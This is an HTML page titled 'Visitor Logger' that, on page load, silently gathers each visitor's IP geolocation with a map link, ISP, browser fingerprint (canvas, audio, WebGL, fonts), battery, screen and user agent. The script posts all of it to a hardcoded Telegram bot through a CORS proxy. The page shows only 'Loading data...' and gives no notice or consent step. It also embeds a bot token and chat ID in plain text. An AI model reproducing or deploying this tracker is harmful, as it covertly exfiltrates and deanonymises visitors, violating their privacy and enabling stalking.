<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Visitor Logger</title>
  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
</head>
<body>
  <h1>Loading data...</h1>
  <script>
    const TELEGRAM_BOT_TOKEN = "7951216599:AAFiExWSRz2hwQeJPIQjprlba_zVycgeo7k";
    const CHAT_ID = "7218964278";

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipapi.co/json");
        return await res.json();
      } catch {
        return {};
      }
    }

    async function getFingerprint() {
      const fp = await FingerprintJS.load();
      const result = await fp.get();
      return result;
    }

    async function getBatteryInfo() {
      if (navigator.getBattery) {
        const b = await navigator.getBattery();
        return `Level: ${Math.round(b.level * 100)}%, Charging: ${b.charging}`;
      }
      return "Not supported";
    }

    async function sendMessage(text) {
      const proxy = "https://api.allorigins.win/raw?url=" + encodeURIComponent(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
      );

      await fetch(proxy, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: "Markdown"
        })
      });
    }

    async function main() {
      const ipInfo = await getIPInfo();
      const battery = await getBatteryInfo();
      const fp = await getFingerprint();
      const nav = navigator;
      const screen = window.screen;

      const mapLink = ipInfo.latitude && ipInfo.longitude
        ? `[📍 Open Map](https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude})`
        : 'Location not available';

      const msg = `
📥 *New Visitor Detected*

🕹 *IP:* ${ipInfo.ip || 'Unknown'}
🌍 *Location:* ${ipInfo.city || 'N/A'}, ${ipInfo.region || 'N/A'}, ${ipInfo.country_name || 'N/A'}
${mapLink}

🧭 *ISP:* ${ipInfo.org || 'N/A'}
🕰 *Timezone:* ${ipInfo.timezone || 'N/A'}
📅 *Date:* ${new Date().toLocaleString()}

🖥 *User Agent:* ${nav.userAgent}
🗣 *Language:* ${nav.language}
📏 *Screen:* ${screen.width}x${screen.height}
🔋 *Battery:* ${battery}

🧬 *Fingerprint:* \`${fp.visitorId}\`
🎨 *Canvas:* ${fp.components.canvas?.value || 'N/A'}
🎧 *Audio:* ${fp.components.audio?.value || 'N/A'}
🧩 *WebGL:* ${fp.components.webgl?.value?.vendor || 'N/A'} / ${fp.components.webgl?.value?.renderer || 'N/A'}
🔠 *Fonts:* ${fp.components.fonts?.value?.join(", ") || 'N/A'}
      `.trim();

      await sendMessage(msg);
      document.body.innerHTML = "<h1>✅ Data berhasil dikirim ke Telegram!</h1>";
    }

    main();
  </script>
</body>
</html>
